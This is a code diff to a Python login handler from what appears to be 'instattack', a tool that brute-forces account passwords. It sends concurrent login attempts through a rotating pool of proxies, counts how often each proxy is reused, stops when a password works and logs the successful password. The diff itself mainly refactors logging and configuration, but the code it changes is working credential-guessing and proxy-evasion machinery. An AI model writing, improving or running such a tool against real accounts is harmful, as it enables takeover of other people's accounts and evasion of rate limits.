@@ -4,16 +4,20 @@ import asyncio
 import aiohttp
 import collections
 
+from instattack import logger
 from instattack.conf import settings
-from instattack.src.exceptions import ClientResponseError
-from instattack.lib import starting, starting_context, percentage
+from instattack.lib import starting, percentage
 
+from instattack.src.exceptions import ClientResponseError
 from instattack.src.proxies.exceptions import PoolNoProxyError
 
 from .models import LoginAttemptContext, LoginContext
 from .exceptions import NoPasswordsError
-from .base import PostRequestHandler
+from .requests import PostRequestHandler
 from .utils import limit_on_success, limit_as_completed
+
+
+log = logger.get_async('Login Handler')
 
 
 class LoginHandler(PostRequestHandler):
@@ -23,9 +27,9 @@ class LoginHandler(PostRequestHandler):
     def __init__(self, config, proxy_handler, **kwargs):
         super(LoginHandler, self).__init__(config, proxy_handler, **kwargs)
 
-        self.limit = config['login']['password_limit']
-        self.batch_size = config['login']['batch_size']
-        self.attempt_batch_size = config['login']['attempt_batch_size']
+        self.limit = config['password_limit']
+        self.batch_size = config['batch_size']
+        self.attempt_batch_size = config['attempt_batch_size']
 
         self.log_attempts = config['log']['attempts']
         self.log_login = config['log']['login']
@@ -51,10 +55,9 @@ class LoginHandler(PostRequestHandler):
         return await self.attack(loop)
 
     async def attack(self, loop):
-        with starting_context(self):
-            # Make sure we are just returning the results from the login attempts
-            # method, or possibly the results consumption, depending.
-            result = await self.attempt_login(loop)
+        # Make sure we are just returning the results from the login attempts
+        # method, or possibly the results consumption, depending.
+        result = await self.attempt_login(loop)
 
         # If we return the result right away, the handler will be stopped and
         # leftover tasks will be cancelled.  We have to make sure to save the
@@ -75,18 +78,18 @@ class LoginHandler(PostRequestHandler):
         """
         leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
         if len(leftover) != 0:
-            self.log_async.start(f'Cleaning Up {len(leftover)} Proxy Saves...')
+            log.start(f'Cleaning Up {len(leftover)} Proxy Saves...')
             save_results = await asyncio.gather(*self._all_tasks, return_exceptions=True)
 
             leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
-            self.log_async.complete(f'Done Cleaning Up {len(leftover)} Proxy Saves...')
+            log.complete(f'Done Cleaning Up {len(leftover)} Proxy Saves...')
 
             for i, res in enumerate(save_results):
                 if isinstance(res, Exception):
-                    self.log_async.critical('Noticed Exception When Saving Proxy')
+                    log.critical('Noticed Exception When Saving Proxy')
 
         leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
-        self.log_async.info(f'{len(leftover)} Leftover Incomplete Tasks.')
+        log.info(f'{len(leftover)} Leftover Incomplete Tasks.')
 
     @starting('Password Prepopulation')
     async def prepopulate(self, loop):
@@ -98,7 +101,7 @@ class LoginHandler(PostRequestHandler):
         if len(futures) == 0:
             raise NoPasswordsError()
 
-        self.log_async.complete(f"Prepopulated {len(futures)} Password Attempts")
+        log.complete(f"Prepopulated {len(futures)} Password Attempts")
 
     async def login_task_generator(self, loop, session):
         """
@@ -128,7 +131,8 @@ class LoginHandler(PostRequestHandler):
         using different proxies, so this is the top level of a tree of nested
         concurrent IO operations.
         """
-        log = self.log_async.create_conditional(self.log_login, subname='attempt_login')
+        log = logger.get_async('Login Requests', subname='attempt_login')
+        log.disable_on_false(self.log_login)
 
         def stop_on(result):
             if result.authorized or not result.not_authorized:
@@ -138,50 +142,56 @@ class LoginHandler(PostRequestHandler):
         log.debug('Waiting on Start Event...')
         await self.start_event.wait()
 
-        with starting_context(self, 'Login Requests', subname='attempt_login'):
-            log.start('Started Session...')
+        log.start('Started Session...')
 
-            while not self.stop_event.is_set():
-                cookies = await self.cookies()
-                async with aiohttp.ClientSession(
-                    connector=self._connector,
-                    cookies=cookies,
-                    timeout=self._timeout,
-                ) as session:
+        while not self.stop_event.is_set():
+            cookies = await self.cookies()
+            async with aiohttp.ClientSession(
+                connector=self._connector,
+                cookies=cookies,
+                timeout=self._timeout,
+            ) as session:
 
-                    gen = self.login_task_generator(loop, session)
-                    async for result in limit_as_completed(gen, self.batch_size, stop_on=stop_on):
+                gen = self.login_task_generator(loop, session)
+                async for result in limit_as_completed(gen, self.batch_size, stop_on=stop_on):
+                    log.debug('Received Result from Generator')
 
-                        if self.stop_event.is_set():
-                            break
+                    if self.stop_event.is_set():
+                        log.debug('Stop Event Noticed... Breaking Out of Generator')
+                        break
 
-                        # Generator Does Not Yield None on No More Coroutines
-                        if not result.conclusive:
-                            raise RuntimeError("Result should be valid and conclusive.")
+                    # Generator Does Not Yield None on No More Coroutines
+                    if not result.conclusive:
+                        raise RuntimeError("Result should be valid and conclusive.")
 
-                        self.num_completed += 1
-                        log.success(
-                            f'Percent Done: {percentage(self.num_completed, self.login_index)}')
+                    self.num_completed += 1
+                    log.success(
+                        f'Percent Done: {percentage(self.num_completed, self.login_index)}')
 
-                        # Store The Result
-                        await self.results.put(result)
+                    # Store The Result
+                    log.debug('Storing Result')
+                    await self.results.put(result)
 
-                        if result.authorized:
-                            log.success(str(result), extra={
-                                'password': result.context.password
-                            })
+                    if result.authorized:
+                        log.success(str(result), extra={
+                            'password': result.context.password
+                        })
 
-                            # TODO: Do we really need to set the stop event?
-                            log.debug('Setting Stop Event')
-                            self.stop_event.set()
-                        else:
-                            if not result.not_authorized:
-                                raise RuntimeError('Result should not be authorized.')
+                        # TODO: Do we really need to set the stop event?
+                        log.debug('Setting Stop Event')
+                        self.stop_event.set()
+                    else:
+                        if not result.not_authorized:
+                            raise RuntimeError('Result should not be authorized.')
 
-                            await self.attempts.put(result.context.password)
+                        log.debug('Storing Attempt')
+                        await self.attempts.put(result.context.password)
+                        log.debug('Attempt Stored')
 
         log.complete('Closing Session')
         await asyncio.sleep(0)
+
+        log.debug('Returning Result')
         return result
 
     async def login_attempt_task_generator(self, loop, session, context):
@@ -197,11 +207,11 @@ class LoginHandler(PostRequestHandler):
             proxy = await self.proxy_handler.pool.get()
             if not proxy:
                 # TODO: Raise Exception Here Instead
-                self.log_async.error('No More Proxies in Pool')
+                log.error('No More Proxies in Pool')
                 break
 
             if proxy.unique_id in self.proxies_count:
-                self.log_async.warning(
+                log.warning(
                     f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
                     extra={'proxy': proxy}
                 )
@@ -223,7 +233,7 @@ class LoginHandler(PostRequestHandler):
         current fetches to the batch_size.  Will return when it finds the first
         request that returns a valid result.
         """
-        log = self.log_async.sublogger("login_with_password")
+        log = logger.get_async(self.__name__, subname="login_with_password")
 
         # Wait for start event to signal that we are ready to start making
         # requests with the proxies.
@@ -254,7 +264,8 @@ class LoginHandler(PostRequestHandler):
         that is smarter and will notify the handler to use a different proxy and
         note the time.
         """
-        log = self.log_async.create_conditional(self.log_attempts, subname='attempt_login')
+        log = logger.get_async('Requesting Login', subname='login_request')
+        log.disable_on_false(self.log_attempts)
 
         try:
             # Temporarary to make sure things are working properly.
@@ -303,7 +314,7 @@ class LoginHandler(PostRequestHandler):
                 self._all_tasks.append(task)
 
     async def save(self, loop):
-        log = self.log_async.sublogger("save")
+        log = logger.get_async(self.__name__, subname="save")
 
         log.info('Dumping Password Attempts')
         log.critical('Have to make sure were not saving a successful password.')
